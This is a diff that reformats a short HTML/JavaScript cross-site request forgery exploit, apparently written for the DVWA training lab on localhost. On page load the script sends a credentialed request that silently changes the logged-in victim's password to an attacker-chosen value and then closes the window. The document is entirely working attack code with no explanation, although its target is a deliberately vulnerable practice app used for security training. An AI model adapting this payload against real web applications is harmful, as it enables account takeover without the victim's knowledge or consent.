@@ -1,18 +1,18 @@
 <script>
 
-  function start(){
-  	let host = "localhost"
-  	let url = `http://${host}/dvwa/vulnerabilities/csrf/?password_new=some_secret_password&password_conf=some_secret_password&Change=Change`
-  	let xmlReq = new XMLHttpRequest();
-  	xmlReq.open("GET", url, true)
+  function start() {
+    let host = 'localhost';
+    let url = `http://${host}/dvwa/vulnerabilities/csrf/?password_new=some_secret_password&password_conf=some_secret_password&Change=Change`;
+    let xmlReq = new XMLHttpRequest();
+    xmlReq.open('GET', url, true);
     xmlReq.setRequestHeader('Access-Control-Allow-Headers', '*');
     xmlReq.setRequestHeader('Access-Control-Allow-Origin', '*');
     xmlReq.setRequestHeader('Origin', `http://${host}`);
-  	xmlReq.withCredentials = true
-  	xmlReq.send()
-    window.close()
+    xmlReq.withCredentials = true;
+    xmlReq.send();
+    window.close();
   }
   
-  start()
+  start();
 
 </script>
